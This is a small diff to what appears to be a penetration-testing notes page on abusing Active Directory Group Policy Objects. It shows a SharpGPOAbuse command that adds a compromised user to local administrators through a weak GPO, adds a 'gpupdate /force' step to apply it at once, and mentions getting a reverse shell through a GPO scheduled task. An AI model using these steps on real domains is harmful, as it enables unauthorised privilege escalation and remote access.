@@ -16,6 +16,10 @@ OR simply, add our compromised user to the local administrator group
 
     .\SharpGPOAbuse.exe --AddLocalAdmin --GPOName "weakGPO" --UserAccount USER
 
+Update GPO to run immediately
+
+    gpupdate /force
+
 # Linux
 
 We can update a GPO with a scheduled task for example to obtain a reverse shell
